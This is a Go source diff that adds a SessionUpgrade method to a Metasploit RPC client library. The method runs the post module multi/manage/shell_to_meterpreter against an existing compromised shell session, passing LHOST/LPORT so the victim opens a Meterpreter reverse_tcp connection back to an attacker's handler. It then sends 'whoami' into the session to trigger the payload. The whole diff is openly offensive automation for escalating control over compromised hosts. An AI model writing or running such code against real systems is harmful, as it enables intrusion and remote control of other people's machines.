@@ -3,6 +3,8 @@ package msfrpc
 import (
 	"context"
 	"strconv"
+	"strings"
+	"time"
 
 	"github.com/pkg/errors"
 )
@@ -122,4 +124,68 @@ func (msf *MSFRPC) SessionWrite(ctx context.Context, id uint64, data string) (ui
 	}
 	n, _ := strconv.ParseUint(result.WriteCount, 10, 64)
 	return n, nil
+}
+
+// SessionUpgrade is used to attempt to spawn a new Meterpreter session through an
+// existing Shell session. This requires that a multi/handler be running
+// (windows/meterpreter/reverse_tcp) and that the host and port of this handler is
+// provided to this method.
+//
+// API from MSFRPC will leaks, so we do it self.
+func (msf *MSFRPC) SessionUpgrade(
+	ctx context.Context,
+	id uint64,
+	host string,
+	port uint64,
+	opts map[string]interface{},
+	wait time.Duration,
+) (*ModuleExecuteResult, error) {
+	// get operating system
+	list, err := msf.SessionList(ctx)
+	if err != nil {
+		return nil, err
+	}
+	info := list[id]
+	if info == nil {
+		return nil, errors.Errorf("invalid session id: %d", id)
+	}
+	os := strings.Split(info.ViaPayload, "/")[1]
+	// run post module
+	const module = "multi/manage/shell_to_meterpreter"
+	if opts == nil {
+		opts = make(map[string]interface{})
+	}
+	opts["SESSION"] = id
+	opts["LHOST"] = host
+	opts["LPORT"] = port
+	opts["HANDLER"] = false
+	result, err := msf.ModuleExecute(ctx, "post", module, opts)
+	if err != nil {
+		return nil, err
+	}
+	// must wait some for payload
+	const minWaitTime = 5 * time.Second
+	if wait < minWaitTime {
+		wait = minWaitTime
+	}
+	timer := time.NewTimer(wait)
+	defer timer.Stop()
+	select {
+	case <-timer.C:
+	case <-ctx.Done():
+		return nil, errors.WithStack(ctx.Err())
+	}
+	// must input some command, power shell will start work
+	if os == "windows" {
+		_, err = msf.SessionWrite(ctx, id, "\nwhoami\n")
+	}
+	// wait some time for power shell
+	timer.Reset(3 * time.Second)
+	defer timer.Stop()
+	select {
+	case <-timer.C:
+	case <-ctx.Done():
+		return nil, errors.WithStack(ctx.Err())
+	}
+	return result, err
 }
